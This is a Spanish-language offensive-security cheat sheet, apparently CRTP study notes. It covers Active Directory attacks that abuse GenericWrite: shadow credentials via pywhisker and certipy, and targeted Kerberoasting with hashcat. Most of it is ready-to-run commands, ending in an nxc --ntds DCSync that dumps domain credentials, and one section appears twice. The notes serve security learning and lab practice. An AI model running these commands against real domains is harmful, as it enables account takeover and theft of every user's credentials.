# Shadow Credentials Attack 

Tags: #CRTP #Kali #GenericWrite #msDS-KeyCredentialLink #Pywhisker #Certipy 

Objeto: 
	- usuarios --> fpena
Atributos:
	- Nombre: Fabian
	- Apellido: Peña
	- SAMAccountName: fpena
	- msDS-KeyCredentialLink: Llave pública para la autenticación, o sea para autenticar <-- (IMPORTANTE)
ACL:
	- Son una lista de accesos
	- Y las lista de acceso tiene una seria de permisos y cada permiso es un ACE
Permisos:
	- GenericAll = Permiso total sobre un usuario 
	- GenericWrite = Permiso para escribir sobre un usuario 

##  WRITE - msDS-KeyCredentialLink (Escribir sobre el atributo) - Shadow Credentials Attack 

Ataque:
	1. Crear una llave privada y pública 
	2. Colocar la llave pública sobre el objeto
	3. Me autentico con el usuario 

* [PyWhisker](https://github.com/ShutdownRepo/pywhisker/tree/main/pywhisker)
* [Shadow Credentials attack](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)

```bash 
# Instalación 
❯ git clone https://github.com/ShutdownRepo/pywhisker.git
❯ cd pywhisker
❯ python3 -m venv env
❯ source env/bin/activate
❯ pip install --upgrade pip
❯ pip install -r requirements.txt
❯ cd pywhisker
```

```bash
# Shadow credentials attack 
❯ pywhisker.py -d "domain" -u "ControlledAccount" -p "password" --dc-ip IP --target "targetAccount" --action list 
# Listar el atributo del usuario víctima para ver lo siguiente: 'msDS-KeyCredentialLink is either empty ...'

❯ pywhisker.py -d "domain" -u "ControlledAccount" -p "password" --dc-ip IP --target "targetAccount" --action "add" 
# La tool crea una llave privada, una pública y lo añade al usuario víctima 

	# dc-ip = IP del DC
	# d = Dominio 
	# u = usuario atacante 
	# p = Contraseña del usuario atacante 
	# t = usuario víctima 

Notas:
	1. Crear un directorio en donde se guardará toda la info del comando 
	2. El output muestra la 'password' que se utilizará para obtener un TGT 
```

```bash 
# CERTIPY AUTH (funciona si PKINIT está habilitado)

# Autenticarse en el dominio generando el TGT y el NTLM HASH 
❯ certipy-ad auth -pfx cert.pfx -password 'pass123' -username targetAccount -domain domain.com -dc-ip IP
	# pfx = Es el certificado que crea el comando anterior 
	# password = Es la password que muestra el comando anterior 
	# username = Es el usuario víctima 
```

```bash 
❯ nxc smb IP -u targetAccount -H NT          # Verificar 
❯ nxc smb IP -u targetAccount -H NT --ntds   # Ejecutar un DCSync si tiene los permisos 
```

## GenericWrite sobre un usuario - Forma 1 (Kerberosteable) 

Ataques:
	1. Targered Kerberoast --> Colocar un SPN 
	2. Shadow Credential Attack --> Modificar msDS-KeyCredentialLink

* [TargetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)

```bash 
# Instalación
❯ git clone https://github.com/ShutdownRepo/targetedKerberoast.git
❯ cd targetedKerberoast
❯ pip3 install -r requirements.txt --break-system-packages
```

```bash 
Paso 1:
# Sincronizar el reloj con el DC
❯ sudo timedatectl set-ntp false
❯ sudo ntpdate IP_DC
# o
❯ sudo chronyd -q 'server IP_DC iburst'
```

```powershell 
Paso 2:
❯ targetedKerberoast.py -u "ControlledAccount" -p "password" -d "domain" --dc-ip IP
# Esto lo hace para todos los usuarios y al usuario que encuentre con el permiso de GenericWrite le escribe temporal sobre el atributo SPN para obtener el TGT. 

	# u = Usuario atacante 
	# p = Contraseña del usuario atacante 
```

```bash 
Paso 3:
# Crackear el hash 
❯ hashcat -m 13100 --force -a 0 --rules /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule kerberoasting.tgt  /usr/share/wordlists/rockyou.txt   

	# kerberoasting.tgs = Contiene el TGT del comando anterior 
```

## GenericWrite sobre un usuario - Forma 2 (Shadow Credentials Attack) 

* [PyWhisker](https://github.com/ShutdownRepo/pywhisker/tree/main/pywhisker)
* [Shadow Credentials attack](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)

```bash
# Shadow credentials attack 
❯ pywhisker.py -d "domain" -u "ControlledAccount" -p "password" --dc-ip IP --target "targetAccount" --action list 
# Listar el atributo del usuario víctima para ver lo siguiente: 'msDS-KeyCredentialLink is either empty ...'

❯ pywhisker.py -d "domain" -u "ControlledAccount" -p "password" --dc-ip IP --target "targetAccount" --action "add" 
# La tool crea una llave privadaa, una pública y lo añade al usuario víctima 

	# dc-ip = IP del DC
	# d = Dominio 
	# u = usuario atacante 
	# p = Contraseña del usuario atacante 
	# t = usuario víctima 

Notas:
	1. Crear un directorio en donde se guardará toda la info del comando 
	2. El output muestra la 'password' que se utilizará para obtener un TGT 
```

```bash 
# CERTIPY AUTH (funciona si PKINIT está habilitado)

# Autenticarse en el dominio generando el TGT y el NTLM HASH 
❯ certipy-ad auth -pfx cert.pfx -password 'pass123' -username targetAccount -domain domain.com -dc-ip IP
	# pfx = Es el certificado que crea el comando anterior 
	# password = Es la password que muestra el comando anterior 
	# username = Es el usuario víctima 
```

```bash 
❯ nxc smb IP -u targetAccount -H NT          # Verificar 
❯ nxc smb IP -u targetAccount -H NT --ntds   # Ejecutar un DCSync si tiene los permisos 
```